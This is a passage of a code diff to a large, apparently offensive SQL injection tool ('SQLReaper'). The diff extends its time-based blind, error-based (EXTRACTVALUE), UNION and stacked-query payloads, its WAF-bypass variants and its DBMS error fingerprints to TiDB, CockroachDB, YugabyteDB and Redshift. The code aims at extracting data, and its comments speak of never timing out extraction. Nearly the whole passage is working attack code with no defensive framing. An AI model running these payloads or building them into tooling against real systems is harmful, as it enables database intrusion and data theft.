+                 f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+SUBSTRING+pg_sleep"),
+                (f"'; SELECT pg_sleep(CASE WHEN 7*13=91 THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN 7*13=92 THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+arithmetic+pg_sleep"),
+                # ── Numeric-context ───────────────────────────────────────────
+                (f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "SUBSTRING+pg_sleep(numeric)"),
+                (f" AND (SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "arithmetic+pg_sleep(numeric)"),
+                # ── Heavy-query fallback (Redshift supports generate_series) ──
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
             ],
         }
         # Prepend derived timing payloads
@@ -118342,7 +119776,18 @@ class TechniqueCascadeEngine:
                                 _t27_specific_kws = {
                                     "MySQL":      ["SLEEP(", "BENCHMARK(", "EXTRACTVALUE(", "UPDATEXML("],
                                     "MariaDB":    ["SLEEP(", "BENCHMARK(", "EXTRACTVALUE(", "UPDATEXML("],
+                                    # BUG-T27-TIDB-KWS FIX: TiDB is MySQL-wire-compatible.
+                                    # When --dbms=TiDB is set, payloads use SLEEP()/EXTRACTVALUE()
+                                    # same as MySQL. Without this entry, _t27_specific always
+                                    # False for TiDB → threshold stays 6 instead of dropping to 3
+                                    # on DBMS-specific payload blocks. TIDB_VERSION() is a TiDB
+                                    # unique function that, if blocked, is very strong evidence.
+                                    "TiDB":       ["SLEEP(", "BENCHMARK(", "EXTRACTVALUE(", "UPDATEXML(", "TIDB_VERSION("],
                                     "PostgreSQL": ["PG_SLEEP(", "::INTEGER", "::TEXT", "GENERATE_SERIES("],
+                                    # BUG-T27-YUGABYTEDB-KWS FIX: YugabyteDB is PostgreSQL-wire-
+                                    # compatible. When --dbms=YugabyteDB is set, payloads contain
+                                    # pg_sleep()/ASCII(). Without this entry, threshold stays at 6.
+                                    "YugabyteDB": ["PG_SLEEP(", "::INTEGER", "::TEXT", "YB_HASH_CODE("],
                                     "MSSQL":      ["WAITFOR", "CONVERT(INT,", "ISNULL(CAST("],
                                     "Oracle":     ["ROWNUM", "DBMS_PIPE", "UTL_INADDR", "DRITHSX"],
                                     "SQLite":     ["RANDOMBLOB(", "TYPEOF(", "SQLITE_VERSION("],
@@ -118608,7 +120053,8 @@ class TechniqueCascadeEngine:
                 return [template]
             # Use DBMS-native evasive true conditions that WAFs don't trivially fingerprint.
             # Avoid literal 1=1 / 2=2 / 'a'='a' — WAFs block these on sight.
-            if dbms == "PostgreSQL":
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-EVASIVE-COND-PG-CRDB FIX: wire-compat PG DBMSes share the same functions.
                 conds = [
                     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)=1e0",
                     "NOT (1e0 IS NULL)",
@@ -118616,20 +120062,14 @@ class TechniqueCascadeEngine:
                     "OCTET_LENGTH('')=0",
                     "CURRENT_SCHEMA IS NOT NULL",
                 ]
-            elif dbms == "MySQL":
+            elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-EVASIVE-COND-TIDB FIX: TiDB supports all MySQL/MariaDB scalar functions.
                 conds = [
                     "ISNULL(NULL)",
                     "STRCMP('a','b')<>0",
                     "LENGTH(VERSION())>0",
                     "CHARSET(USER()) IS NOT NULL",
                     "COALESCE(1,0)=1",
-                ]
-            elif dbms == "MariaDB":
-                conds = [
-                    "ISNULL(NULL)",
-                    "LENGTH(VERSION())>0",
-                    "COALESCE(1,0)=1",
-                    "STRCMP('a','b')<>0",
                 ]
             elif dbms == "MSSQL":
                 conds = [
@@ -123590,7 +125030,9 @@ class TechniqueCascadeEngine:
                         ("opt_hint",      NovelWAFBypass.optimizer_hint_inject(base_p)),
                         ("floor_ceil",    NovelWAFBypass.floor_ceil_equiv(base_p)),
                     ]
-                    if dbms in ("MySQL", "MariaDB"):
+                    if dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-NOVEL-WAF-TIDB FIX: TiDB supports MySQL hex strings, x-hex,
+                        # charset prefix, and zero-width split like MySQL/MariaDB.
                         _novel_variants += [
                             ("zw_split",   NovelWAFBypass.zero_width_split(base_p)),
                             ("hex_str",    NovelWAFBypass.mysql_hex_string(base_p)),
@@ -123622,7 +125064,9 @@ class TechniqueCascadeEngine:
                                     _novel_variants.append((f"v18_{_v18_method}", _v18v))
                             except Exception:
                                 pass
-                    if dbms in ("MySQL", "MariaDB") and hasattr(NovelWAFBypassV18, "stacked_comment"):
+                    if dbms in ("MySQL", "MariaDB", "TiDB") and hasattr(NovelWAFBypassV18, "stacked_comment"):
+                        # BUG-NOVEL-WAFV18-STACKED-CMT-TIDB FIX: TiDB supports MySQL-style
+                        # stacked comment WAF bypass like MySQL/MariaDB.
                         try:
                             _sc = NovelWAFBypassV18.stacked_comment(base_p)
                             if _sc and _sc != base_p:
@@ -125978,13 +127422,14 @@ class UniversalScanOrchestrator:
                 for _ci2 in range(_n_cols):
                     # Build concat expression for detected DBMS
                     _dbms_d = result.detection.dbms or "MySQL"
-                    if _dbms_d in ("MySQL", "MariaDB"):
+                    if _dbms_d in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-UNION-CONCAT-TIDB FIX: TiDB uses CONCAT() like MySQL.
                         _concat_expr = f"CONCAT('{_PART_A}','{_PART_B}')"
                     elif _dbms_d == "MSSQL":
                         _concat_expr = f"'{_PART_A}'+'{_PART_B}'"
                     elif _dbms_d == "Oracle":
                         _concat_expr = f"'{_PART_A}'||'{_PART_B}'"
-                    else:  # PostgreSQL default
+                    else:  # PostgreSQL, CockroachDB, YugabyteDB, Redshift, SQLite, etc.
                         _concat_expr = f"'{_PART_A}'||'{_PART_B}'"
 
                     _pts2 = ["NULL"] * _n_cols; _pts2[_ci2] = _concat_expr
@@ -126201,7 +127646,8 @@ class UniversalScanOrchestrator:
             #   - Certified DBMS-specific stacked payloads (Req 1)
             #   - _send_injected routing so tamper chains and mutation apply (Req 6)
             #   - _EXTRACTION_STARTED guard to skip when extraction already running (Req 4)
-            if result.detection.technique == "BT" and _confirmed_dbms in ("PostgreSQL", "MySQL", "MSSQL"):
+            if result.detection.technique == "BT" and _confirmed_dbms in ("PostgreSQL", "MySQL", "MariaDB", "TiDB", "MSSQL",
+                                                                             "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-STK-DETECT-NEWDBMS FIX: all wire-compat DBMSes support stacked query probing via BT technique
                 if not _EXTRACTION_STARTED[0]:
                     print("[*] Testing stacked query support...", flush=True)
                     stacked_supported = False
@@ -129173,10 +130619,10 @@ class ScannerV13(ScannerV12):
                             _imm_data = entry.get("data", data)
                             await asyncio.wait_for(
                                 self._process_v11(engine, entry, _imm_data, tamper_chain),
-                                timeout=3600)  # 24h  never timeout extraction
+                                timeout=86400)  # 24h — never timeout extraction
                             entry["_extracted"] = True
                             print(f"[+] Extraction completed for param={param!r}", flush=True)
-                            
+
                             # Stop scanning after first successful extraction
                             if not getattr(cfg, 'continue_after_injection', False):
                                 print("[+] First injection found and extracted  scan complete", flush=True)
@@ -130847,7 +132293,9 @@ class ScannerV14(ScannerV13):
                                                                     ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                                     (f"' AND (SELECT 1 FROM {_nonexist_tbl_hdr})-- -", "table"),
                                                                 ]
-                                                            elif _err_dbms == "PostgreSQL":
+                                                            elif _err_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                                # BUG-HEADERINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
+                                                                # ::integer cast and 1/0 division error identical to PostgreSQL.
                                                                 _pcv_c_fallbacks = [
                                                                     ("' AND 1/0-- -", "division"),
                                                                     (" AND 1/0-- -", "division-ctx"),
@@ -130865,6 +132313,17 @@ class ScannerV14(ScannerV13):
                                                                     ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                                     (f"' AND (SELECT 1 FROM {_nonexist_tbl_hdr})-- -", "table"),
                                                                 ]
+                                                            elif _err_dbms in ("TiDB",):
+                                                                # BUG-HDR-PCVC-TIDB-FALLBACK FIX: TiDB supports EXTRACTVALUE/UPDATEXML
+                                                                # identical to MySQL. Without explicit branch, TiDB fell to generic else.
+                                                                _pcv_c_fallbacks = [
+                                                                    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb"),
+                                                                    (" AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb-ctx"),
+                                                                    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
+                                                                    (" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue-ctx"),
+                                                                    ("' AND 1/0-- -", "division"),
+                                                                    (f"' AND (SELECT 1 FROM {_nonexist_tbl_hdr})-- -", "table"),
+                                                                ]
                                                             else:  # MySQL and generic fallback
                                                                 _pcv_c_fallbacks = [
                                                                     ("' AND 1/0-- -", "division"),
@@ -130879,9 +132338,29 @@ class ScannerV14(ScannerV13):
                                                                           "xpath syntax error", "extractvalue(", "division by zero"],
                                                                 "MariaDB": ["you have an error in your sql", "check the manual",
                                                                             "error 1064", "sqlstate[", "xpath syntax error", "division by zero"],
+                                                                # BUG-HDR-PCVC-TIDB-ERRPAT FIX: TiDB is MySQL-wire-compatible; identical error
+                                                                # signatures. Without this entry TiDB fell to the generic default which is
+                                                                # weaker and missed TiDB-specific "tidb server" / "check the manual" patterns.
+                                                                "TiDB": ["you have an error in your sql", "check the manual that corresponds to your tidb",
+                                                                         "tidb server", "error 1064", "sqlstate[",
+                                                                         "xpath syntax error", "extractvalue(", "division by zero"],
                                                                 "PostgreSQL": ["error:  division by zero", "error:  invalid input syntax",
                                                                                "division by zero", "invalid input syntax for type",
                                                                                "error:  relation", "sqlstate: 22012"],
+                                                                # BUG-HDR-PCVC-CRDB-YG-REDSHIFT-ERRPAT FIX: PG-wire-compatible engines share
+                                                                # PostgreSQL error patterns. Without entries they fell to the generic default.
+                                                                "CockroachDB": ["error:  division by zero", "error:  invalid input syntax",
+                                                                                "pq: ", "crdb_internal", "cockroach",
+                                                                                "division by zero", "invalid input syntax for type",
+                                                                                "sqlstate: 22012", "sqlstate: 42601"],
+                                                                "YugabyteDB": ["error:  division by zero", "error:  invalid input syntax",
+                                                                               "yugabyte", "ysql",
+                                                                               "division by zero", "invalid input syntax for type",
+                                                                               "sqlstate: 22012", "sqlstate: 42601"],
+                                                                "Amazon Redshift": ["error:  division by zero", "error:  invalid input syntax",
+                                                                                    "amazon redshift", "redshift",
+                                                                                    "division by zero", "invalid input syntax for type",
+                                                                                    "sqlstate: 22012", "sqlstate: 42601"],
                                                                 "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                           "divide by zero", "arithmetic overflow", "invalid object name"],
                                                                 "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -131350,13 +132829,20 @@ class ScannerV14(ScannerV13):
                                                                         (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                                         ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                                     ]
-                                                                elif _ed == "PostgreSQL":
+                                                                elif _ed in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-JSON-PCV-CRDB-YG-REDSHIFT FIX: PG-compat engines use ::integer cast and 1/0 division
                                                                     _pcv_c_fallbacks = [
                                                                         ("' AND 1/0-- -", "division"),
                                                                         (" AND 1/0-- -", "division-ctx"),
                                                                         ("' AND CAST('abc' AS INTEGER)-- -", "CAST"),
                                                                         (" AND CAST('abc' AS INTEGER)-- -", "CAST-ctx"),
                                                                         ("' AND 'abc'::integer=1-- -", "pg_cast"),
+                                                                    ]
+                                                                elif _ed in ("TiDB",):  # BUG-JSON-PCV-TIDB FIX: TiDB is MySQL-compat; EXTRACTVALUE and table-check
+                                                                    _pcv_c_fallbacks = [
+                                                                        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb"),
+                                                                        (" AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb-ctx"),
+                                                                        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
+                                                                        ("' AND 1/0-- -", "division"),
                                                                     ]
                                                                 elif _ed in ("MariaDB",):
                                                                     _pcv_c_fallbacks = [
@@ -131378,8 +132864,16 @@ class ScannerV14(ScannerV13):
                                                                               "xpath syntax error", "extractvalue(", "division by zero"],
                                                                     "MariaDB": ["you have an error in your sql", "error 1064",
                                                                                 "xpath syntax error", "division by zero"],
+                                                                    "TiDB": ["you have an error in your sql", "error 1064", "error 1105",
+                                                                             "xpath syntax error", "extractvalue(", "tidb", "division by zero"],  # BUG-JSON-PCV-TIDB-ERRPAT FIX
                                                                     "PostgreSQL": ["error:  division by zero", "error:  invalid input syntax",
                                                                                    "division by zero", "invalid input syntax for type"],
+                                                                    "CockroachDB": ["error:  division by zero", "pq: ", "crdb_internal",
+                                                                                    "division by zero", "invalid input syntax for type"],  # BUG-JSON-PCV-CRDB-ERRPAT FIX
+                                                                    "YugabyteDB": ["error:  division by zero", "yugabyte", "ysql",
+                                                                                   "division by zero", "invalid input syntax for type"],  # BUG-JSON-PCV-YG-ERRPAT FIX
+                                                                    "Amazon Redshift": ["error:  division by zero", "redshift",
+                                                                                        "division by zero", "invalid input syntax for type"],  # BUG-JSON-PCV-REDSHIFT-ERRPAT FIX
                                                                     "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                               "divide by zero", "arithmetic overflow"],
                                                                     "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -131755,7 +133249,9 @@ class ScannerV14(ScannerV13):
                                                                 (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                                 ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                             ]
-                                                        elif _gql_dbms == "PostgreSQL":
+                                                        elif _gql_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                            # BUG-GQLINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
+                                                            # ::integer cast and 1/0 division error like PostgreSQL.
                                                             _pcv_c_fallbacks = [
                                                                 ("' AND 1/0-- -", "division"),
                                                                 (" AND 1/0-- -", "division-ctx"),
@@ -131770,6 +133266,14 @@ class ScannerV14(ScannerV13):
                                                                 ("' AND CAST('abc' AS SIGNED)-- -", "CAST_signed"),
                                                                 ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                             ]
+                                                        elif _gql_dbms in ("TiDB",):
+                                                            # BUG-GQL-PCVC-TIDB-FALLBACK FIX: TiDB supports EXTRACTVALUE identical to MySQL.
+                                                            _pcv_c_fallbacks = [
+                                                                ("' AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb"),
+                                                                ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
+                                                                ("' AND 1/0-- -", "division"),
+                                                                (f"' AND (SELECT 1 FROM {_nonexist_tbl_gql})-- -", "table"),
+                                                            ]
                                                         else:  # MySQL and generic
                                                             _pcv_c_fallbacks = [
                                                                 ("' AND 1/0-- -", "division"),
@@ -131783,8 +133287,18 @@ class ScannerV14(ScannerV13):
                                                                       "xpath syntax error", "extractvalue(", "division by zero"],
                                                             "MariaDB": ["you have an error in your sql", "error 1064",
                                                                         "xpath syntax error", "division by zero"],
+                                                            # BUG-GQL-PCVC-TIDB-ERRPAT FIX: TiDB MySQL-wire-compat error patterns
+                                                            "TiDB": ["you have an error in your sql", "tidb server", "error 1064", "error 1105",
+                                                                     "xpath syntax error", "extractvalue(", "division by zero"],
                                                             "PostgreSQL": ["error:  division by zero", "error:  invalid input syntax",
                                                                            "division by zero", "invalid input syntax for type"],
+                                                            # BUG-GQL-PCVC-CRDB-YG-REDSHIFT-ERRPAT FIX: PG-wire-compat error patterns
+                                                            "CockroachDB": ["error:  division by zero", "pq: ", "crdb_internal",
+                                                                            "division by zero", "invalid input syntax for type"],
+                                                            "YugabyteDB": ["error:  division by zero", "yugabyte", "ysql",
+                                                                           "division by zero", "invalid input syntax for type"],
+                                                            "Amazon Redshift": ["error:  division by zero", "redshift",
+                                                                                "division by zero", "invalid input syntax for type"],
                                                             "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                       "divide by zero", "arithmetic overflow"],
                                                             "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -132141,7 +133655,9 @@ class ScannerV14(ScannerV13):
                                                             (" AND CAST('abc' AS INT)-- -", "CAST-ctx"),
                                                             ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                         ]
-                                                    elif _xml_dbms == "PostgreSQL":
+                                                    elif _xml_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                                        # BUG-XMLINJECT-PCV-PG-CRDB FIX: wire-compatible PG DBMSes support
+                                                        # ::integer cast and 1/0 division error like PostgreSQL.
                                                         _pcv_c_fallbacks = [
                                                             ("' AND 1/0-- -", "division"),
                                                             (" AND 1/0-- -", "division-ctx"),
@@ -132156,6 +133672,14 @@ class ScannerV14(ScannerV13):
                                                             ("' AND CAST('abc' AS SIGNED)-- -", "CAST_signed"),
                                                             ("' AND CAST('abc' AS DECIMAL)-- -", "CAST_decimal"),
                                                         ]
+                                                    elif _xml_dbms in ("TiDB",):
+                                                        # BUG-XML-PCVC-TIDB-FALLBACK FIX: TiDB supports EXTRACTVALUE identical to MySQL.
+                                                        _pcv_c_fallbacks = [
+                                                            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,TIDB_VERSION()))-- -", "extractvalue_tidb"),
+                                                            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
+                                                            ("' AND 1/0-- -", "division"),
+                                                            (f"' AND (SELECT 1 FROM {_nonexist_tbl_xml})-- -", "table"),
+                                                        ]
                                                     else:  # MySQL and generic
                                                         _pcv_c_fallbacks = [
                                                             ("' AND 1/0-- -", "division"),
@@ -132169,8 +133693,18 @@ class ScannerV14(ScannerV13):
                                                                   "xpath syntax error", "extractvalue(", "division by zero"],
                                                         "MariaDB": ["you have an error in your sql", "error 1064",
                                                                     "xpath syntax error", "division by zero"],
+                                                        # BUG-XML-PCVC-TIDB-ERRPAT FIX: TiDB MySQL-wire-compat error patterns
+                                                        "TiDB": ["you have an error in your sql", "tidb server", "error 1064", "error 1105",
+                                                                 "xpath syntax error", "extractvalue(", "division by zero"],
                                                         "PostgreSQL": ["error:  division by zero", "error:  invalid input syntax",
                                                                        "division by zero", "invalid input syntax for type"],
+                                                        # BUG-XML-PCVC-CRDB-YG-REDSHIFT-ERRPAT FIX: PG-wire-compat error patterns
+                                                        "CockroachDB": ["error:  division by zero", "pq: ", "crdb_internal",
+                                                                        "division by zero", "invalid input syntax for type"],
+                                                        "YugabyteDB": ["error:  division by zero", "yugabyte", "ysql",
+                                                                       "division by zero", "invalid input syntax for type"],
+                                                        "Amazon Redshift": ["error:  division by zero", "redshift",
+                                                                            "division by zero", "invalid input syntax for type"],
                                                         "MSSQL": ["divide by zero error encountered", "conversion failed when converting",
                                                                   "divide by zero", "arithmetic overflow"],
                                                         "Oracle": ["ora-00904", "ora-01476", "ora-01722", "ora-00933", "ora-00907",
@@ -133559,7 +135093,7 @@ class ScannerV14(ScannerV13):
                 if not result and (cfg.techniques in ("ALL","all","*") or "T" in cfg.techniques):
                     _dp_dbms = (getattr(cfg,'forced_dbms',None) or getattr(cfg,'_detected_dbms',None)
                                 or getattr(cfg,'_candidate_dbms',None))
-                    _dp_list = [_dp_dbms] if _dp_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+                    _dp_list = [_dp_dbms] if _dp_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
                     # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
                     # FIX-R6: mutate_all() applies all 20 mutation layers.
                     # FIX-R9: asyncio.sleep(0) yields event loop between iterations.
@@ -137843,8 +139377,10 @@ class SQLPayloadTransformer:
                 results.append(("arith_pg", mod2,
                                  f"pg_sleep(({condition[:20]})::int*{t})"))
         
-        if dbms in ("MySQL", "MariaDB"):
-            # MySQL: boolean is 0/1 natively, no cast needed
+        # BUG-ALLSTRATEGIES-TIDB-ARITH FIX: TiDB is MySQL-wire-compatible; SLEEP() and
+        # BENCHMARK() support arithmetic multiplication with boolean like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # MySQL/TiDB: boolean is 0/1 natively, no cast needed
             arith_arg = f"({condition}) * {t}"
             mod2 = T.replace_function_arg(p, r"SLEEP", arith_arg)
             if mod2:
@@ -137883,8 +139419,9 @@ class SQLPayloadTransformer:
                 results.append(("oracle_heavy", mod4b,
                                  "Oracle heavy query conditional"))
 
-        #  Strategy 5: MySQL IF() wrapping 
-        if dbms in ("MySQL", "MariaDB"):
+        #  Strategy 5: MySQL/TiDB IF() wrapping
+        # BUG-ALLSTRATEGIES-TIDB-IF FIX: TiDB supports IF() and BENCHMARK() like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             mod5 = T.replace_function_call(p, r"SLEEP",
                         f"IF(({condition}),SLEEP({t}),0)")
             if mod5:
@@ -137931,7 +139468,7 @@ class SQLPayloadTransformer:
                            f"{p} AND {heavy_delay}>0-- -",
                            "PostgreSQL heavy computation delay"))
         
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             # BUG-MYSQL-HEAVY-NONCOND FIX (CRITICAL): WHERE clause approach is
             # non-conditional for non-constant extraction expressions (ORD/SUBSTRING).
             # MySQL's optimizer must scan the cross-join before evaluating WHERE,
@@ -137942,12 +139479,13 @@ class SQLPayloadTransformer:
             # when condition is FALSE the inner subquery never executes → fast (0ms).
             # When condition is TRUE the inner subquery runs the cross-join → slow.
             # This makes the timing oracle truly conditional on the extraction expression.
+            # BUG-ALLSTRATEGIES-TIDB-HEAVY FIX: TiDB uses information_schema like MySQL.
             heavy_delay = (f"(SELECT CASE WHEN ({condition}) THEN "
                            f"(SELECT COUNT(*) FROM information_schema.tables a, "
                            f"information_schema.tables b) ELSE 0 END)")
             results.append(("heavy_computation_mysql",
                            f"{p} AND {heavy_delay}>=0-- -",
-                           "MySQL heavy computation delay"))
+                           "MySQL/TiDB heavy computation delay"))
         
         if dbms == "SQLite":
             # Heavy generate_series or recursive CTE delay
@@ -137967,17 +139505,18 @@ class SQLPayloadTransformer:
                            f"{p} AND {cross_join}>0-- -",
                            "PostgreSQL cross join delay"))
         
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             # BUG-MYSQL-CROSSJOIN-NONCOND FIX (CRITICAL): Same root cause as
             # BUG-MYSQL-HEAVY-NONCOND FIX above. WHERE clause on 3-way cross-join
             # is also non-conditional for non-constant extraction expressions.
+            # BUG-ALLSTRATEGIES-TIDB-CROSSJOIN FIX: TiDB supports cross-join timing.
             cross_join = (f"(SELECT CASE WHEN ({condition}) THEN "
                           f"(SELECT COUNT(*) FROM information_schema.tables a, "
                           f"information_schema.tables b, information_schema.tables c) "
                           f"ELSE 0 END)")
             results.append(("cross_join_mysql",
                            f"{p} AND {cross_join}>=0-- -",
-                           "MySQL 3-way cross join delay"))
+                           "MySQL/TiDB 3-way cross join delay"))
         
         if dbms in ("MSSQL", "Sybase"):
             cross_join = f"(SELECT count(*) FROM sys.objects a, sys.objects b WHERE ({condition}))"
@@ -137994,11 +139533,12 @@ class SQLPayloadTransformer:
                            p.replace(f"pg_sleep({t})", nested) if f"pg_sleep({t})" in p else p,
                            "PostgreSQL nested function call"))
         
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-ALLSTRATEGIES-TIDB-NESTED FIX: TiDB supports IFNULL/IF like MySQL.
             nested = f"IFNULL(IF(({condition}),SLEEP({t}),NULL),0)"
             results.append(("nested_mysql",
                            p.replace(f"SLEEP({t})", nested) if f"SLEEP({t})" in p else p,
-                           "MySQL nested IF/IFNULL"))
+                           "MySQL/TiDB nested IF/IFNULL"))
 
         return results
 
@@ -138059,8 +139599,13 @@ class MultiStrategyExtractor:
 
     #  DBMS-specific configs 
     _SLEEP_FN = {
-        "PostgreSQL":  "pg_sleep({t})",   "CockroachDB": "pg_sleep({t})",
+        "PostgreSQL":      "pg_sleep({t})",   "CockroachDB":    "pg_sleep({t})",
+        # BUG-SLEEPFN-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() is valid.
+        # BUG-SLEEPFN-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; pg_sleep() is valid.
+        # BUG-SLEEPFN-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; pg_sleep() valid.
+        "YugabyteDB":      "pg_sleep({t})",   "Amazon Redshift": "pg_sleep({t})",
         "MySQL":       "SLEEP({t})",      "MariaDB":     "SLEEP({t})",
+        "TiDB":        "SLEEP({t})",
         "MSSQL":       "WAITFOR DELAY '0:0:{t}'",
         # BUG-MSE-ORACLE-DBMSPIPE-SLEEP FIX: The previous entry used
         # DBMS_PIPE.RECEIVE_MESSAGE('x',{t}) which requires EXECUTE privilege on
@@ -138092,9 +139637,14 @@ class MultiStrategyExtractor:
         "Informix":    "SELECT SLEEP({t}) FROM sysmaster:informix",  # Informix sleep
     }
     _HEAVY_FROM = {
-        "PostgreSQL":  "pg_class",     "CockroachDB": "pg_class",
+        "PostgreSQL":      "pg_class",     "CockroachDB":    "pg_class",
+        # BUG-HEAVYFROM-TIDB FIX: TiDB uses information_schema.columns like MySQL.
+        # BUG-HEAVYFROM-YUGABYTE FIX: YugabyteDB uses pg_class like PostgreSQL.
+        # BUG-HEAVYFROM-REDSHIFT FIX: Amazon Redshift uses pg_class like PostgreSQL.
+        "YugabyteDB":      "pg_class",     "Amazon Redshift": "pg_class",
         "MySQL":       "information_schema.columns",
         "MariaDB":     "information_schema.columns",
+        "TiDB":        "information_schema.columns",
         "MSSQL":       "sys.objects",  "Oracle":      "all_objects",
         "SQLite":      "sqlite_master",
         # BUG-MISSING-DBMS-HEAVYFROM FIX: Added system tables for remaining DBMSes
@@ -138579,7 +140129,9 @@ class MultiStrategyExtractor:
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     _tmpl_base = _prefix + "({cond})::int*{T}" + _suffix
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MSE-SLEEPALITH-TIDB FIX: TiDB is MySQL-wire-compatible; arithmetic
+                    # multiplication of SLEEP() argument with boolean is valid in TiDB.
                     _tmpl_base = _prefix + "({cond})*{T}" + _suffix
                 else:
                     _tmpl_base = _prefix + "({cond})*{T}" + _suffix
@@ -138847,7 +140399,11 @@ class MultiStrategyExtractor:
                 ("raise",   "DO $body$ BEGIN RAISE EXCEPTION 'e'; END $body$", "SELECT 1"),
                 ("nulldiv", "SELECT 1/(1-1)",          "SELECT 1/(1+1)"),
             ]
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-PROBE-ERROR-TIDB FIX: TiDB is MySQL-wire-compatible.
+            # EXTRACTVALUE, UPDATEXML, EXP, and GTID_SUBSET are all valid TiDB SQL.
+            # Without TiDB, _probe_error() falls to the generic else (SELECT 1/0 only),
+            # losing error-based oracle discrimination for TiDB targets.
             _err_methods = [
                 ("div0",     "SELECT 1/0",              "SELECT 1"),
                 ("extractval","SELECT EXTRACTVALUE(1,CONCAT(0x7e,1))", "SELECT 1"),
@@ -139070,8 +140626,9 @@ class MultiStrategyExtractor:
             _stmt = _err_stmts.get(_method, "PERFORM 1/0")
             p = self._build_stacked(
                 f"DO $body$ BEGIN IF ({cond}) THEN {_stmt}; END IF; END $body$")
-        elif _s and self.dbms in ("MySQL", "MariaDB"):
-            # MySQL: use prepared statement with IF
+        elif _s and self.dbms in ("MySQL", "MariaDB", "TiDB"):
